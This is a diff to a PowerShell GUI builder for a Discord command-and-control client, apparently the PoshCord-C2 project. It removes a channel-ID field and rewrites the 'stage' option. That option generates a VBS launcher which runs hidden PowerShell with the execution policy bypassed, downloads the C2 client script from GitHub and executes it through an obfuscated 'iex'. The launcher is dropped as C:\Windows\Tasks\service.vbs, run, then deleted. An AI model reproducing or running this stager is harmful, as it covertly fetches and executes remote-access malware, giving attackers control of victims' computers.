@@ -84,24 +84,6 @@ $TextBoxInput.Text = ""
 $TextBoxInput.Multiline = $False
 $TextBoxInput.Font = 'Microsoft Sans Serif,10'
 
-$TextboxInputHeader2 = New-Object System.Windows.Forms.Label
-$TextboxInputHeader2.Text = "Primary Channel ID"
-$TextboxInputHeader2.ForeColor = "#bcbcbc"
-$TextboxInputHeader2.AutoSize = $true
-$TextboxInputHeader2.Width = 25
-$TextboxInputHeader2.Height = 10
-$TextboxInputHeader2.Location = New-Object System.Drawing.Point(15, 65)
-$TextboxInputHeader2.Font = 'Microsoft Sans Serif,10,style=Bold'
-
-$TextBoxInput2 = New-Object System.Windows.Forms.TextBox
-$TextBoxInput2.Location = New-Object System.Drawing.Point(20, 85)
-$TextBoxInput2.BackColor = "#eeeeee"
-$TextBoxInput2.Width = 400
-$TextBoxInput2.Height = 45
-$TextBoxInput2.Text = ""
-$TextBoxInput2.Multiline = $False
-$TextBoxInput2.Font = 'Microsoft Sans Serif,10'
-
 $buildHeader = New-Object System.Windows.Forms.Label
 $buildHeader.Text = "Build Option"
 $buildHeader.ForeColor = "#bcbcbc"
@@ -157,17 +139,15 @@ $outEXE = $outputbox.Text
 
 if($fullbox.Checked){
 "`$tk = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force -Append
-"`$ch = `"$TextBox2`"" | Out-File -FilePath $tempc2client -Force -Append
 i`wr -Uri "$parent" -OutFile $tempc2client
 }
 
 if($stagebox.Checked){
-"`$dc = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force
-"`$ch = `"$TextBox2`"" | Out-File -FilePath $tempc2client -Force -Append
+"`$tk = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force
 "`$tobat = @`"" | Out-File -FilePath $tempc2client -Append
 "Set WshShell = WScript.CreateObject(```"WScript.Shell```")" | Out-File -FilePath $tempc2client -Append
 "WScript.Sleep 200" | Out-File -FilePath $tempc2client -Append
-"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$dc='`$dc';```$ch='`$ch'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | i``ex```", 0, True" | Out-File -FilePath $tempc2client -Append
+"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tk='`$tk'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | i``ex```", 0, True" | Out-File -FilePath $tempc2client -Append
 "`"@" | Out-File -FilePath $tempc2client -Append
 '$pth = "C:\Windows\Tasks\service.vbs";$tobat | Out-File -FilePath $pth -Force ;& $pth;Sleep 5;rm -Path $pth' | Out-File -FilePath $tempc2client -Append
 }
